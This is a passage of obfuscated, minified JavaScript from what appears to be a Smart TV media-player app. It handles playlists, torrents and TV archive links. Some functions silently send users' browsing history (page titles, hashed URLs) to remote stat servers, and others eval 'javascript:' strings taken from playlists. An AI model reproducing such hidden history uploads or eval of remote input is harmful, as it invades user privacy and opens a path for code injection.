if(!c.sendedstat){if(pq.elCh.type=="enterurl"){hint('<img style="float: left;						    margin: 2px 6px 0px 0px;				    width: 25px;				    height: 25px;				    background: #9e9e9e;" src="https://raw.githubusercontent.com/komivp/appinfodl/main/static/page_fav_off_white.png">'+"Добавьте этот сайт в закладки или Стартовое меню, чтоб не потерять его!","kb5");uHelper.create("directnoheader").hid().getI("http://browser.appinfo.su/gstatic.php?id=spiderStat&m="+((c.channels.length&&c.ERR==null)?"c":"f")+"&ver=3#POSTs="+encodeURIComponent(c.lIQ0Il1IlIb1Il1OYpr)+"&img="+encodeURIComponent(c.icon))}else if(c.ERR==404||c.channels.length==0){uHelper.create("directnoheader").hid().getI("http://browser.appinfo.su/gstatic.php?id=spiderStat&m=e&ver=3#POSTs="+encodeURIComponent(c.lIQ0Il1IlIb1Il1OYpr)+"&parent="+encodeURIComponent(c.parentURL)+"&img="+encodeURIComponent(c.icon))}}
c.sendedstat=1}else if(!c.sendedstat2){var n=0,u="",t="";for(var i=oInset[insetActive].history.length-1;i>-1;i--){if(oInset[insetActive].history[i].url.indexOf("about")==0){n=i;break}}
console.log("-----INFO-----");var sp=[],sendsp=0,is_x=0;if(m==0)sendsp=-2;for(i=n+1;i<oInset[insetActive].history.length;i++){if(u!="")u+="-";if(t!="")t+="-|-";var ur=oInset[insetActive].history[i].url.replace(/http.*?\/treeview/,"http://remotefork/treeview");u+=md5(ur);t+=oInset[insetActive].history[i].title;var ks=oInset[insetActive].history[i];if(sendsp==0)sendsp=1;if(ks.url.indexOf("http")!=0||(is_local(ks.url)&&kjtYpr.GL.remote&&kjtYpr.GL.remoteactive)){sendsp=-1;continue}
if(is_xxx(ks.url))is_x=1;var tim=ks.img;if(ks.url.match(/(#submenu|no_save)/))continue;else if(ks.url.indexOf("alexkdpulg.php?list=")>0)var tu=unescape(ks.url.split("?list=")[1]);else if(ks.url.indexOf("alexkdpulg.php")>0){sendsp=-1;continue}else tu=ks.url;if(tu.lastIndexOf("?")==tu.length-1)tu=tu.substr(0,tu.length-1);tu=tu.replace(/[\?&#](iu=|bc=true|box_mac=).*/,"");var ttl=fp(ks.title);var tmp={"url":tu,"title":ttl,"img":tim};if(tmp.url.length<120)sp.push(tmp)}
console.log(sp);console.log(oInset[insetActive].history[i-1].url);if(tp>0.15){console.log("-----пропуск "+tp+"-----");return}
if(ttmac)kjtYpr.popUp("Send SendSP="+sendsp,1500);if(sendsp==1&&m==1)uHelper.create("directnoheader").hid().getI("http://browser.appinfo.su/gstatic.php?id=add3#POSTs="+encodeURIComponent(llIl1I1HlMgNII1IO0Ypr(sp)));else{console.log("FALSE SEND sPIDER STAT "+sendsp)}
var tp=Math.random();uHelper.create("directnoheader").hid().getI("http://browser.appinfo.su/gstatic.php#POSTu="+u+"&m="+m+"&t="+encodeURIComponent(t));c.sendedstat2=1}},toSource:function(pq){var c=this;console.log("toSource ");var u=c.lIQ0Il1IlIb1Il1OYpr;var source=gV(c.lI1101I0v1OO1OIYpr.page,"source");if(source==""){var d=c.lI1101I0v1OO1OIYpr.page.global;d.channels=c.lI1101I0v1OO1OIYpr.page.channels;source=llIl1I1HlMgNII1IO0Ypr(d)}
if(u.indexOf("no_save")>0)u=u.substring(0,Math.ceil(u.length-u.length/2.5));var r=/\\u([\d\w]{4})/gi;var style={"width":"98%","height":"100%","left":css_w(10)+"px","top":css_wh(10)+"px","textAlign":"left"};pq.data={};pq.data.before="<textarea id='scrolltextarea' style='overflow-y:scroll;width:100%;background-color:#eeeeee;color:black;height:100%;'>"+source.replace(/no_save/g,"").replace(r,function(match,grp){return String.fromCharCode(parseInt(grp,16))})+"</textarea>";c.toChannels(pq)},listGroup:function(sel){var c=this;var t=c.lIQ0Il1IlIb1Il1OYpr.split("#group=");if(sel==null){var submenu=[];for(var i=0;i<c.group.length;i++){var el={"title":"<span style='color:white;'>"+c.group[i]+"</span>","playlist_url":"group="+i};if(c.menu.length<9)c.menu.push(el);else submenu.push(el)}
if(submenu.length)c.menu.push({"title":"<span style='color:white;'>...</span>","playlist_url":"submenu","submenu":submenu});if(t.length>1)c.listGroup(t[1])}else{if(sel<0)sel=c.group.length-1;else if(sel>c.group.length-1)sel=0;chGroupSel=sel;for(var i=0;i<c.menu.length;i++){if(c.menu[i].playlist_url.indexOf("group=")==0){if(c.menu[i].playlist_url.split("group=")[1]==sel)c.menu[i].title=c.menu[i].title.replace(/color:.*?;/,"color:black;");else c.menu[i].title=c.menu[i].title.replace(/color:.*?;/,"color:white;")}}
if(chGroupSel==0){c.channels=c.origchannels}else{c.channels=[];for(var i=0;i<c.origchannels.length;i++){var z=c.origchannels[i].group.split(";");for(var j=0;j<z.length;j++){if(z[j]==c.group[chGroupSel]){c.channels.push(c.origchannels[i]);break}}}}
oInset[insetActive].focused(0)}},openCh:function(pq){var c=this;lI1101I0v1OO1OIYpr=pq.lI1101I0v1OO1OIYpr;console.log("openCh "+pq.mode+" rek_url="+rek_url);console.log(pq.elCh);if(lI1101I0v1OO1OIYpr==null)lI1101I0v1OO1OIYpr=oInset[insetActive];c.lI1101I0v1OO1OIYpr=lI1101I0v1OO1OIYpr;modeGroup=!1;if(handler=="move"||(handler=="player"&&rek_url!=""))return;if($_("MenuCh").style.display=="block"){Menu=[];lI1I1IxFCIh1l01llYpr("MenuCh","");$_("MenuCh").style.display="none";handler="menu"}
if(pq.inputed!=null||$_("vk").style.display!="none"){if(gV(pq.elCh,"filter")!="answer")returnVK(1)}
chGroupSel=0;if(ll00llb0Uvh0Q0IOYpr>0){clearTimeout(lllO00OlOuIZp10l1IYpr);ll00llb0Uvh0Q0IOYpr=0;is_loadpage(-1);kjtYpr.inf("Прервано!",800);return}
elCh=l0QO11lOz0bfh10l0Ypr(llIl1I1HlMgNII1IO0Ypr(c.toTags(pq.elCh,pltags)));elGlobal=c.toTags(pq.elGlobal,pltags);if(gV(elCh,"onclick")!=""){if(elCh.onclick=="autouserexport()"){autoexport("user");setTimeout(function(){elCh.onclick="";pq.elCh=elCh;c.openCh(pq)},3000);return}}
console.log(elCh);c.parentCh=l0QO11lOz0bfh10l0Ypr(llIl1I1HlMgNII1IO0Ypr(elCh));if(!c.l1IOIl100j1fXIlIIYpr)kjtYpr.lastSearch="";rek_mode=null;if(elCh.playlist_url.indexOf("group=")==0&&typeof c.lI1101I0v1OO1OIYpr.page!="undefined"){var g=elCh.playlist_url.substr(6);var gu=c.lI1101I0v1OO1OIYpr.page.SAVE_lIQ0Il1IlIb1Il1OYpr.split("#group")[0];if(typeof prev[gu]!="undefined"){c.lIQ0Il1IlIb1Il1OYpr=c.SAVE_lIQ0Il1IlIb1Il1OYpr=gu+"#group="+g;pq.data=prev[gu];c.toChannels(pq);return}}
if(elCh.stream_url.match(/\.torrent$/)&&elCh.stream_url.indexOf("torrent://")!=0){elCh.playlist_url="torrent://"+elCh.stream_url;elCh.stream_url=""}
if(elCh.stream_url.match(/^(torrent|magnet:)/)){elCh.playlist_url=elCh.stream_url;elCh.stream_url=""}
var ar=["playlist_url","stream_url","parser","parser2","mb_parser"];for(elem in ar)elCh[ar[elem]]=trylink(gV(elCh,ar[elem]));ar=["parser","parser2","mb_parser"];for(tag in ar){if(gV(elCh,ar[tag])!=""){console.log(elCh[ar[tag]]);var params={"ch":elCh,"pq":pq,"tag":ar[tag]};params.callback=function(a_pq){console.log("lIIl11110nmrsul1IOOIYpr callback");console.log(a_pq);c.openCh(a_pq)}
return c.lIIl11110nmrsul1IOOIYpr(params)}}
console.log(oInset[insetActive].select);if(c.preOpen(pq)){console.log(pq);is_loadpage(0);return}
console.log("GO: "+elCh.playlist_url+"/"+elCh.stream_url);if(elCh.playlist_url.indexOf("cmd:")==0){c.handlerData({"data":{"cmd":elCh.playlist_url.substr(4)}},lI1101I0v1OO1OIYpr.lIQ0Il1IlIb1Il1OYpr);return c.cancel()}
c.SEARCH_TEMPL="";if(elCh.stream_url+elCh.playlist_url.indexOf("SearchName")==0){}else if(elCh.playlist_url!=""&&elCh.stream_url==""){if(elCh.playlist_url.indexOf("view-source:")==0){if(typeof prev[elCh.playlist_url]=="undefined"){if(elCh.playlist_url.substr(12)==c.parentURL){return c.toSource(pq)}else{elCh.playlist_url=elCh.playlist_url.substr(12);pq.tosource=1}}else pq.tosource=1}
pl_serv=0;pl_count=1;while(gV(elCh,"playlist_url"+(1+pl_count))!="")pl_count++;if(app_cors&&elCh.playlist_url.indexOf("alexkdpulg.php?list=")>0){elCh.playlist_url=decodeURIComponent(elCh.playlist_url.split("?list=")[1])}
if(this.xhr!=null){delete this.xhr}else{var xml_url=elCh.playlist_url;console.log(xml_url);if(pq.inputed!=null){if(xml_url.indexOf("{search}")!=-1){c.SEARCH_TEMPL=xml_url.replace("{search}","%s");xml_url=xml_url.replace("{search}",encodeURIComponent(pq.inputed.text))}else{c.SEARCH_TEMPL=sU(xml_url,"search=%s");xml_url=sU(xml_url,"search="+encodeURIComponent(pq.inputed.text))}
c.SAVE_lIQ0Il1IlIb1Il1OYpr=xml_url}
c.lIQ0Il1IlIb1Il1OYpr=xml_url;var data=0;if(xml_url.indexOf("about:")===0){data=getVars(xml_url,pq)}else if(xml_url.match(/^(zakladki|bookmarks)/)){data=xhr_bookmark(xml_url)}
if(data!==0){if(data==null){if(xml_url.match(/^(zakladki|bookmarks)/))kjtYpr.inf("_FPZdesPusto_!",1000);return c.cancel()}else{console.log(data);pq.data=data;c.toChannels(pq);statusbar("off")}}else if(xml_url.indexOf("alert(")==0||xml_url.indexOf("javascript:alert(")==0){confirmed.create(xml_url.match(/alert\((.*)\)/)[1],c.lI1101I0v1OO1OIYpr.page.XML_DOMAIN,"OK")}else if(xml_url.indexOf("#archive|")>0){console.log("URLDATA #archive");c.lIQ0Il1IlIb1Il1OYpr=c.SAVE_lIQ0Il1IlIb1Il1OYpr=xml_url;var c=xml_url.split("#archive|");var d=c[1].split("|");var ch=[];pq.lI1101I0v1OO1OIYpr.put("s",getSelect());pq.lI1101I0v1OO1OIYpr.put("top",gV(pq,"top"));if(d[1]==""){ch.push({"title":"Нету телепрограммы для канала! "});data={"title":"_FPArchive_ "+d[0],"channels":ch};kjtYpr.ll00Il1IVOCk1IQO0OYpr(data,0,request_id,"ok")}else{if(d[1].indexOf("xmltv-")==0){if(typeof(JtvSRC)=="undefined")JtvSRC={};JtvSRC[md5(c).substr(0,7)]=c;var u="http://51.15.17.204/obovse.ru/smarttv/api.php?do=xmltv&cmd=epg&src="+encodeURIComponent(llIl1I1HlMgNII1IO0Ypr(JtvSRC))+"&mode=full&get="+d[1]+"&start="+d[2]}else u="http://85.17.30.89/common/sip.php?do=full&get="+encodeURIComponent(d[1])+"&start="+d[2];xhrt=new XMLHttpRequest();ch.description+="<center><img id='bloading' src='"+_img("_ST_b_loading.gif")+"' width=15 /></center>";if(handler!="vk")lI1I1IxFCIh1l01llYpr("infoList",ch.description);xhrt.onreadystatechange=function(){if(xhrt.readyState==4){is_loadpage(0);if(c.canceled){console.log("canceled xht");return}
var ch=[];console.log("parsearchive "+xhrt.responseText);var m=l0QO11lOz0bfh10l0Ypr(xhrt.responseText);console.log(m);if(m!=null){if(typeof m[d[1]]=="object"){nj="";while(typeof m[d[1]]["title"+nj]!="undefined"){var au=c[0];if(d[3]=="default"&&d[4]!==""){au=d[4].replace("${start}",m[d[1]]["start"+nj]).replace("${timestamp}",T.timestamp).replace("${offset}",T.timestamp-m[d[1]]["start"+nj])}else if(d[3]=="append"&&d[4]!==""){au+=d[4].replace("${start}",m[d[1]]["start"+nj]).replace("${timestamp}",T.timestamp).replace("${offset}",T.timestamp-m[d[1]]["start"+nj])}else if(d[3]=="flussonic"||d[3]=="fs"||d[3]=="flussonic-hls"){au=au.replace(/([^\?]*\/)([^\?]*?)(\.|\?|$)(.*)/,"$1$2-"+m[d[1]]["start"+nj]+"-10800$3$4")}else if(d[3]=="shift"||1){if(c[0].indexOf("?")>0)au+="&";else au+="?";au+="utc="+m[d[1]]["start"+nj]+"&lutc="+T.timestamp}
if(T.timestamp>m[d[1]]["start"+nj])
ch.unshift({"title":dt(m[d[1]]["start"+nj],!0)+" - "+dt(m[d[1]]["end"+nj])+"</span> "+m[d[1]]["title"+nj],"stream_url":au,"source_url":c[0],"catchup":d[3],"catchup_source":d[4],"catchup_days":(-1*d[2]),"arcCurTime":m[d[1]]["start"+nj]});if(nj=="")nj=2;else nj++}
c.lIQ0Il1IlIb1Il1OYpr=c.SAVE_lIQ0Il1IlIb1Il1OYpr=xml_url+"|"}}
var au=c[0];var def15=T.timestamp-900;if(d[3]=="default"&&d[4]!==""){au=d[4].replace("${start}",def15).replace("${timestamp}",T.timestamp).replace("${offset}",T.timestamp-def15)}else if(d[3]=="append"&&d[4]!==""){au+=d[4].replace("${start}",def15).replace("${timestamp}",T.timestamp).replace("${offset}",def15)}else if(d[3]=="flussonic"||d[3]=="fs"||d[3]=="flussonic-hls"){au=au.replace(/([^\?]*\/)([^\?]*?)(\.|\?|$)(.*)/,"$1$2-"+def15+"-10800$3$4")}else if(d[3]=="shift"||1){if(c[0].indexOf("?")>0)au+="&";else au+="?";au+="utc="+def15+"&lutc="+T.timestamp}
ch.unshift({"title":"15 минут назад","stream_url":au,"source_url":c[0],"catchup":d[3],"catchup_source":d[4],"catchup_days":(-1*d[2]),"arcCurTime":def15});console.log(ch);data={"title":"_FPArchive_ "+d[0],"channels":ch};kjtYpr.ll00Il1IVOCk1IQO0OYpr(data,0,request_id,"ok")}};xhrt.open('GET',u,!0);xhrt.send();is_loadpage(1)}}else if(xml_url.indexOf("AddFavorite(")==0){console.log("add fav");var m=xml_url.match(/AddFavorite\((.*?)\)/)[1];if(m==""){insetSelect=insetCount+1;oInset[insetActive].focused(-1);oInset[insetActive].focused(-1);kjtYpr.l1Q1OIO0duul1l1IlYpr("favmenu")}else{m=m.split(",");if(m.length==3){favarray={};favarray.stream_url="";favarray.search_on="";favarray.playlist_url=m[2];favarray.title=m[0];favarray.logo_30x30=m[1];insetSelect=insetCount+1;oInset[insetActive].focused(-1);oInset[insetActive].focused(-1);kjtYpr.l1Q1OIO0duul1l1IlYpr("favmenu")}else kjtYpr.inf("Error format! Must be AddFavorite(title,icon,url); or AddFavorite();",2000)}}else if(xml_url.indexOf("AddSearch(")==0){console.log("add fav");var m=xml_url.match(/AddSearch\((.*?)\)/)[1];m=m.split(",");if(m.length==3){FXMLPage.addGl(m[2],null,m[0],m[1])}else kjtYpr.inf("Error format! Must be AddSearch(title,icon,url search);",2000)}else if(xml_url.indexOf("app://")==0){var ch=pq.elCh;confirmed.create("Приложение появится в смартхаб<br>"+ch.title,"Установить данное приложение?");confirmed.fun0=function(){var c=ch.playlist_url.substring(6);setTimeout(function(){is_loadpage(1);if(c.indexOf("http")==0)savezipfile(c,ch.title);else{savezipfile("http://obovse.ru/widget/app/"+c)}},500)}}else if(xml_url.indexOf("cmdsetWeatherId")==0){kjtYpr.GL.weather=xml_url.substring(15);kjtYpr.lll0Il11OxICbl1ll0Ypr("settings",llIl1I1HlMgNII1IO0Ypr(kjtYpr.GL));$_("weather").style.display="none";updateWeather()}else if(xml_url.indexOf("extensions://")==0){c.lIQ0Il1IlIb1Il1OYpr=c.SAVE_lIQ0Il1IlIb1Il1OYpr=xml_url;kjtYpr.ll00Il1IVOCk1IQO0OYpr({"channels":[{"title":"Run extension...","playlist_url":xml_url}]},select,request_id);$_("ext").style.display="block";if(xml_url.indexOf("xsmart")>0)lI1I1IxFCIh1l01llYpr("ext",'<iframe id="frame-id" style="margin-top: 0px; border:none; -webkit-transform: scaleX(1.13);" width="1280" height="640" src="'+xml_url.split("extensions://")[1]+'" />');else lI1I1IxFCIh1l01llYpr("ext",'<iframe id="frame-id" style="margin-top: 0px; border:none; " width="1280" height="640" src="'+xml_url.split("extensions://")[1]+'" />');$(document.getElementById('frame-id').contentWindow.document).keyup(function(e){console.log(e);if(e.keyCode==37){i--}});kjtYpr.popUp("<img width='55' src='"+_img("_ST_important.png")+"' style='float:left;padding-right:5px;' /> "+"Запущено расширение<br>"+"Меню - Закрыть расширение<br>"+"CH UP / CH DOWN - Открыть другую вкладку"+"",2000);ext_focus()}else if(xml_url.indexOf("payd_")==0){console.log("set payd");if(xml_url.indexOf("payd_storage")==0){var dm=c.lIQ0Il1IlIb1Il1OYpr.match(rCook);if(dm!=null){dm=dm[3]}
console.log(dm);if(llQOIO10IiuQlOl0Ypr[dm]==null)llQOIO10IiuQlOl0Ypr[dm]={};llQOIO10IiuQlOl0Ypr[dm][xml_url]=pq.inputed.text;console.log(llQOIO10IiuQlOl0Ypr);console.log(llIl1I1HlMgNII1IO0Ypr(llQOIO10IiuQlOl0Ypr));kjtYpr.lll0Il11OxICbl1ll0Ypr("storage",llIl1I1HlMgNII1IO0Ypr(llQOIO10IiuQlOl0Ypr),!0)}
if(typeof pq.elCh.menu=="object"){kjtYpr.l1Q1OIO0duul1l1IlYpr("onlymenu");return}
var val="";if(typeof pq.inputed=="undefined"&&gV(pq.elCh,"value")!=""){var valtitle=pq.elCh.title;val=pq.elCh.value}else val=valtitle=pq.inputed.text;gP().input[pq.elCh.playlist_url.substring(5)]=val;console.log(c.input);var t=lI1101I0v1OO1OIYpr.page.channels[pq.elCh.index].title.split(":");if(t.length>1)var rzd=": ";else rzd=" ";if(gV(pq.elCh,"type")=="password")lI1101I0v1OO1OIYpr.page.channels[pq.elCh.index].title=t[0]+rzd+valtitle.replace(/./g,"*");else lI1101I0v1OO1OIYpr.page.channels[pq.elCh.index].title=t[0]+rzd+valtitle;lI1101I0v1OO1OIYpr.page.channels[pq.elCh.index].value=val;gP().count=0;gP().renderChannels(getSelect());oInset[insetActive].focused()}else if(xml_url.indexOf("game://")==0){var c=xml_url.substring(7);tgame=c;setTimeout(function(){eval(c+"();");kjtYpr.popUp("<b>Управление:</b><br>ОК: Вверх<br>Вниз: Снижение")},300)}else if(xml_url.indexOf("html://")==0){confirmed.create("<b>"+xml_url.substring(7)+"</b>","_FPOpen URL? This application will be closed_").fun0=function(){gP().lIQ0Il1IlIb1Il1OYpr=gP().SAVE_lIQ0Il1IlIb1Il1OYpr=xml_url;lI0lI1O1l1Pa100l0Ypr();lIl0l1OX1vbll1I1IQYpr(addident("http://185.158.114.122/obovse.ru/smarttv/spider.php?id=cmdSpiderStat&s="+encodeURIComponent(pq.elCh.playlist_url)+"&img="+gV(pq.elCh,"logo_30x30")));document.location=xml_url.substr(7)}}else if(xml_url.indexOf("javascript:")==0){eval("(function(){  try{"+xml_url.split("javascript:")[1]+"}catch(e){confirmed.create('Ошибка выполнения javascript:<br>'+e.message,gP().XML_DOMAIN);}  })();")}else if(xml_url=="submenu"){c.lIQ0Il1IlIb1Il1OYpr=c.SAVE_lIQ0Il1IlIb1Il1OYpr=c.lI1101I0v1OO1OIYpr.page.lIQ0Il1IlIb1Il1OYpr+"#submenu"+pq.elCh.index;pq.data=prev[c.lI1101I0v1OO1OIYpr.page.SAVE_lIQ0Il1IlIb1Il1OYpr.split("#submenu")[0].split("#group=")[0]];pq.data.returnSelect=0;c.toChannels(pq)}else if(xml_url.indexOf("cmdmenu")==0){kjtYpr.l1Q1OIO0duul1l1IlYpr()}else if(xml_url.indexOf("cmdEpgRegion")==0){set_epg(xml_url.substr(12))}else if(xml_url=="cmdAbout"||xml_url=="cmdOpenStart"||xml_url=="cmdHelp"||xml_url.indexOf("cmdHistory")==0||xml_url.indexOf("cmdSetWeather")==0||xml_url.indexOf("cmdSetSearch")==0){kjtYpr.l1Q1OIO0duul1l1IlYprPlay(xml_url)}else if(xml_url.indexOf("forkdlna")==0&&kjtYpr.GL.remoteip==""){kjtYpr.popUp("_FPNeobhUstIzap_ Remote Forkplayer!")}else if(gV(pq.elCh,"js_url")!=""){clearInterval(kjtYpr.IntervalUpdateTime);clearInterval(kjtYpr.GlUpdateTime);lIOI10l0lGIOIl1Ypr(pq.elCh.js_url)}else{if(xml_url.indexOf("xml://")==0)xml_url=xml_url.substring(6);if(xml_url.indexOf("torrent://")==0||xml_url.indexOf("magnet:")==0){var c1=xml_url.replace("torrent://","");if(kjtYpr.GL.torrserveactive){if(parseFloat(torver)>=1.2)xml_url="http://"+getip("torrserve")+"/stream/playlists.m3u?link="+encodeURIComponent(c1)+"&m3u";else xml_url="http://"+getip("torrserve")+"/torrent/play?m3u=true&link="+encodeURIComponent(c1)}else if(kjtYpr.GL.aceactive)xml_url="http://"+getip("acestream")+"/server/api?method=get_media_files&url="+encodeURIComponent(c1);else if(kjtYpr.build>=7){elCh.url=c1;ll0lIOsIoIIlOlYpr(elCh);return}else{l0OI10IRge011lO1Ypr();l1IOI0lu11lO1IYpr(15);return}}else if(xml_url.indexOf("torrentb64://")==0){if(kjtYpr.GL.aceactive){c.xhr=uHelper.create("direct");c.xhr.parse=function(s){var data=l0QO11lOz0bfh10l0Ypr(s);if(gV(data,"id")!="")c.openUrl(pq,"http://"+getip("acestream")+"/server/api?method=get_media_files&content_id="+data.id);else kjtYpr.inf("Error get acestream content id",1500)}
c.xhr.postdata="data="+encodeURIComponent(xml_url.substring(13));c.xhr.get("http://api.torrentstream.net/upload/json")}else{l0OI10IRge011lO1Ypr();l1IOI0lu11lO1IYpr(15)}}
if(xml_url.indexOf("hms")==0){is_type="hms";var data={"playlist_name":"","channels":[]};if(xml_url=="hms"){console.log(kjtYpr.GL.remoteip);data.channels.push({"title":"_FPNastroiki_ HMS!","playlist_url":"hms://settings","logo_30x30":"none"});if(kjtYpr.GL.remoteip==""){kjtYpr.popUp("_FPNeobhUstIzap_ Remote Forkplayer!");return""}else{kjtYpr.GL.hms=kjtYpr.GL.remoteip.split(":")[0]+":45397";xml_url="http://"+kjtYpr.GL.hms+"/MediaServer/Folders/0?start=0;count=0"}}}
if(xml_url.indexOf("forkdlna")==0)xml_url="http://"+getip("remoteip")+"/treeview?/";if(xml_url.indexOf("box_mac")>0)xml_url=xml_url.replace(/box_mac/g,"box_mac2");if(xml_url.indexOf("box_user")>0)xml_url=xml_url.replace(/box_user/g,"box_user2");if(xml_url.indexOf("tv/wlist.php")>-1)kjtYpr.popUp("Fork Store App Market<br>_FPPrilUstSh_");c.lIQ0Il1IlIb1Il1OYpr=xml_url;var ref=pq.lI1101I0v1OO1OIYpr.get("url",-2);if(ref=="")ref=c.lIQ0Il1IlIb1Il1OYpr;if(ref.indexOf("http")!=0||ref.match(/(filmix)/))ref="";console.log(xml_url);if(xml_url!=""){if(xml_url.indexOf("payd=on")>0){for(var i in pq.input){xml_url=sU(xml_url,"&payd_"+i+"="+encodeURIComponent(pq.input[i]))}}else if(xml_url.indexOf("=payd_")>0){console.log("set inp");for(var i in pq.input){console.log("repl "+i+" on "+pq.input[i]);xml_url=xml_url.replace("=payd_"+i,"="+encodeURIComponent(pq.input[i]))}}
if(xml_url.indexOf("payd_storage")>0){var dm=xml_url.match(rCook);if(dm!=null){dm=dm[3]}
var regexp=new RegExp("=(payd_storage.*?)(&|$|#)","g");while((ch=regexp.exec(orig_xml_url))!=null){console.log(ch[1]);var tmp="";if(llQOIO10IiuQlOl0Ypr[dm]!=null)if(llQOIO10IiuQlOl0Ypr[dm][ch[1]]!=null)tmp=llQOIO10IiuQlOl0Ypr[dm][ch[1]];xml_url=xml_url.replace(ch[1],tmp)}}
c.openUrl(pq,xml_url)}}}}else if(elCh.stream_url!=""){pq.lI1101I0v1OO1OIYpr.put("s",pq.elCh.index);pq.lI1101I0v1OO1OIYpr.put("top",gV(pq,"top"));pq.lI1101I0v1OO1OIYpr.save();if(c.adv(pq))return;clearTimeout(advTimer);console.log("play "+elCh.stream_url);if(is_audio(elCh.stream_url)&&kjtYpr.GL.audioplayer>0&&pq.mode==null){l1O010LAAOlI1IIYpr(pq.lI1101I0v1OO1OIYpr.page.channels,getSelect());return c.cancel()}
lIIl0Il0LaVOO0OIYpr();pq.url=elCh.stream_url.replace(/\\\//g,"/");if(pq.url.indexOf("setEpg")==0){var z=pq.url.split("|-");if(z[3]=="")try{delete epg_arr[z[2]][z[1]]}catch(e){}else{if(typeof epg_arr[z[2]]=="undefined")epg_arr[z[2]]={};epg_arr[z[2]][z[1]]=z[3]}
kjtYpr.lll0Il11OxICbl1ll0Ypr("epg_set",llIl1I1HlMgNII1IO0Ypr(epg_arr));tmf();setTimeout('kjtYpr.inf("'+z[1]+' уст. епг '+z[3]+'",1500);',150);return c.cancel()}
console.log("type "+lIO1OIOlAQzl1Ol1lYpr);try{if(!stopped&&!is_img(pq.url)&&gV(pq.elCh,"type")!="img"){if(platform=="sams")samsStop();else if(lIO1OIOlAQzl1Ol1lYpr=="ifrhtml5"){lI1I1IxFCIh1l01llYpr("other","");video.src=""}else if(lIO1OIOlAQzl1Ol1lYpr=="html5"){video.src=""}else{lI1I1IxFCIh1l01llYpr("jw","");lI1I1IxFCIh1l01llYpr("other","")}}}catch(e){}
if(pq.url.indexOf("/hls/userencrypt/")>0){pq.url=parse_urlm(pq.url);console.log("conv="+pq.url)}
if(pq.mode!=null)lIO1OIOlAQzl1Ol1lYpr=elCh.openwith=pq.mode;pq.c=c;pq.curCh=elCh;elCh.url=lI0lllQIIIvMhJ1I11lYpr(pq);console.log(elCh.url);if(elCh.url==null||elCh.url==""){c.cancel()}else if(elCh.url!=""&&elCh.url!="assync"){console.log(elCh.url);ll0lIOsIoIIlOlYpr(elCh)}}else{c.cancel();kjtYpr.inf("Пустая ссылка!",1500)}},};var uParser={create:function(method){},};var markedObj={cancel:function(p){if(p==null)var curPage=gP();else curPage=p;if(curPage!=null){for(var i=0;i<curPage.channels.length;i++){if(curPage.is_mark_array[i]){$_("titleid"+i).style.color="";$_("titleid"+i).style.fontWeight="";$_("titleid"+i).style.border=""}}}
curPage.is_mark_array={};curPage.marked=0;curPage.is_mark=0},entries:function(fun){var curPage=gP();if(!curPage.is_mark){try{console.log("mark exec "+getSelect());fun(curPage.channels[getSelect()],getSelect())}catch(e){console.log(e)}}else{for(var i=0;i<curPage.channels.length;i++){if(curPage.is_mark_array[i]){console.log("mark exec "+i);try{fun(curPage.channels[i],i)}catch(e){console.log(e)}}}}
return this}}
function arrDelValue(a,v){for(var i in a){if(a[i]==v)a.splice(i,1)}
return a}
var rid=0,rcurlUrl="",lastUrl={};var uHelper={create:function(method,ccount){try{if(method==null)method="direct|rf|xml";var c=Object.create(this);c.request_id=++rid;c.method=method.split("|");if(method!="direct"&&method!="directnoheader"&&(kjtYpr.GL.remote==0||!kjtYpr.GL.remoteactive))c.method=arrDelValue(c.method,"rf");var nd=-1;for(var i in c.method){if(c.method[i].indexOf("direct")==0)nd=i;if(c.method[i]=="direct"&&kjtYpr.GL.headers>0&&method.indexOf("directnoheader")==-1){c.method.splice((i+1),0,"directnoheader")}}
if(platform=="android-device"&&kjtYpr.build>=7){c.hasandroid=1;if(nd==-1)nd=c.method.length-1;c.method.splice((i+1),0,"android")}else c.method=arrDelValue(c.method,"android");c.select=-4;omni_hor=4;c.mobile=1;c.retry=0;if(ccount==null){lastUrl={};c.count=0}else c.count=ccount+1;c.hidden=0;c.postdata="";c.atime=15000;c.addheaders={};c.fulllink="";c.mwtn=0;c.canceled=0;c.xhr=null;c.xhr2=null;c.xhr4=null;c.waitcnum=1;c.waitc={"start":!1,"mode":null,"timer":null,"cmd":"","xml_url":"","lllO000MuCMlO11Ypr":"","sel":0,"orig_xml_url":"","data_parse":"","lO10I0nIWu01IllYpr":null}}catch(e){console.log(e);kjtYpr.popUp("uErr "+e.message)}
return c},addh:function(h){this.addheaders=h;return this},hid:function(){this.hidden=1;return this},is_remote:function(){if(kjtYpr.GL.remote==0||!kjtYpr.GL.remoteactive)return 0;else return 1},init:function(){if(this.request_id==null)this.request_id=kjtYpr.REQUEST_ID;if(this.mobile=1)this.ua=window.navigator.userAgent;else this.ua=ua_chrome},showbar:function(s){if(!this.hidden||s=="off")statusbar(s,"link")},abort:function(){var c=this;console.log("xhr abort");c.canceled=1;clearTimeout(c.fastremote_timer);if(c.xhr!=null)c.xhr.abort();if(c.xhr2!=null)c.xhr2.abort();if(c.xhr4!=null)c.xhr4.abort();if(!c.hidden)c.showbar("off")},unselfparse:function(data){var c=this;if(c.canceled){console.log("canceled u");return}
if(gV(data,"cors")=="local"){c.xhr2=uHelper.create("directnoheader",c.count)}else if(gV(data,"cors").indexOf("|")>0){c.xhr2=uHelper.create(data.cors,c.count)}else if(app_cors)c.xhr2=uHelper.create("directnoheader|rf",c.count);else c.xhr2=uHelper.create("rf|xml",c.count);c.xhr2.parse=function(s){data.callback(s)}
console.log("uHelp lIIl11110nmrsul1IOOIYpr");console.log(data);c.showbar(data.parse,"link");c.xhr2.get(data.parse,data)},sendrparse:function(data,s){var c=this;var uh=uHelper.create("directnoheader|rf|proxy",c.count);uh.parse=function(s){console.log("res sendrparse"+s);console.log(c.parse);if(c.canceled){console.log("sendrparse canceled ");c.preparse("Your aborted loaded page")}else c.preparse(s)}
var u="";if(typeof data.async=="object"){if(gV(data.async,"post")!=""){u=data.async.post.replace("%s",encodeURIComponent(s))}}
if(u=="")u=sU(c.fulllink,"#POSTparse["+encodeURIComponent(data.parse)+"]="+encodeURIComponent(s));if(gV(data,"data")!="")u=sU(u,"#POST"+data.data);return uh.getI(u)},preparse:function(s){var c=this;if(c.canceled){console.log("preparse canceled ");console.trace();return}
